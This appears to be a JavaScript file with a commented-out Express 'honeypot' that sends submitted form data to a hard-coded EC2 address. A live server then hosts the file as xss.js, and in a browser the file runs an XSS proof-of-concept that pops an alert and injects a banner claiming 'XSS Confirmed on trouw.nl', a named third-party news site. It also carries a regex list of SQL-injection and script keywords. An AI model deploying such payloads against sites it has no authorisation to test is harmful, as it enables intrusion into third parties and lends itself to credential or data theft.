// const express = require('express');
// const fs = require('fs');
// const bodyParser = require('body-parser');
// const cors = require('cors');

// const app = express();
// app.use(bodyParser.json());

// // CORS FIX: Allow Kushvith site + EC2 server
// const allowedOrigins = ['https://kushvith.great-site.net', 'http://localhost:3000', 'http://3.7.71.39', '*'];
// app.use(cors({
//     origin: allowedOrigins,
//     methods: ['GET', 'POST'],
//     allowedHeaders: ['Content-Type']
// }));

// // Honeypot SDK
// app.get('/honeypot.js', (req, res) => {
//     res.setHeader('Content-Type', 'application/javascript');
//     res.setHeader('Access-Control-Allow-Origin', '*');

//     res.send(`
//         (function() {
//             function detectAttack(formData) {
//                 const attackPatterns = [
//                     /(--|#|;|\\/\\*)/i, 
//                     /\\b(UNION|SELECT|INSERT|DELETE|UPDATE|DROP|TRUNCATE|ALTER|EXEC|FROM|WHERE|TABLE)\\b/i,
//                     /\\b(OR|AND)\\b.*[=<>]/i, 
//                     /('|")/, 
//                     /\\b(script|alert|<|>)\\b/i 
//                 ];
                
//                 return Object.values(formData).some(value => 
//                     attackPatterns.some(pattern => pattern.test(value))
//                 );
//             }

//             document.addEventListener('submit', function(event) {
//                 let formData = new FormData(event.target);
//                 let formObject = {};
//                 formData.forEach((value, key) => formObject[key] = value);
                
//                 if (detectAttack(formObject)) {
//                     fetch("https://3.7.71.39/track", { // Use EC2 IP
//                         method: "POST",
//                         headers: { "Content-Type": "application/json" },
//                         body: JSON.stringify({ formObject, userAgent: navigator.userAgent })
//                     })
//                     .then(() => {
//                         window.location.href = "https://3.7.71.39/admin"; // Redirect to EC2 honeypot
//                     })
//                     .catch(err => console.error("Fetch failed:", err));

//                     console.log("SQL Injection detected! Redirecting attacker...");
//                     event.preventDefault();
//                 }
//             }, true);
//         })();
//     `);
// });

// // Log attacker data
// app.post('/track', (req, res) => {
//     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
//     const logData = `
//         Time: ${new Date().toISOString()}
//         IP: ${clientIp}
//         User-Agent: ${req.body.userAgent}
//         Data: ${JSON.stringify(req.body.formObject)}
//     `;

//     fs.appendFileSync('attackers.log', logData + "\n");
//     console.log('Attack logged:', logData);

//     res.status(200).json({ message: 'Tracked successfully' });
// });

// // Fake admin panel
// app.get('/admin', (req, res) => {
//     res.send('<h1>Admin Panel</h1><p>Unauthorized access is monitored.</p>');
// });

// // Use EC2 Public IP or Domain
// app.listen(3001, () => {
//     console.log('Honeypot running at http://3.7.71.39:3001');
// });
// -------------------------------
// 🖥️ Express Server to Serve This File
// -------------------------------
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3001;

// Route to serve this file
app.get('/xss.js', (req, res) => {
  const filePath = path.join(__dirname, 'xss.js');
  res.setHeader('Content-Type', 'application/javascript');
  res.sendFile(filePath);
});

app.listen(PORT, () => {
  console.log(`🚀 xss.js server running at http://localhost:${PORT}/xss.js`);
});

// -------------------------------
// 💥 XSS Payload (when executed in browser)
// -------------------------------

// Don't execute this part on the server side
if (typeof window !== 'undefined') {
  alert("XSS Executed Successfully!");
  document.body.innerHTML += `
    <div style="position:fixed; top:10px; left:10px; background:red; color:white; padding:10px; font-size:20px; z-index:9999;">
      🔥 XSS Confirmed on trouw.nl 🔥
    </div>
  `;
}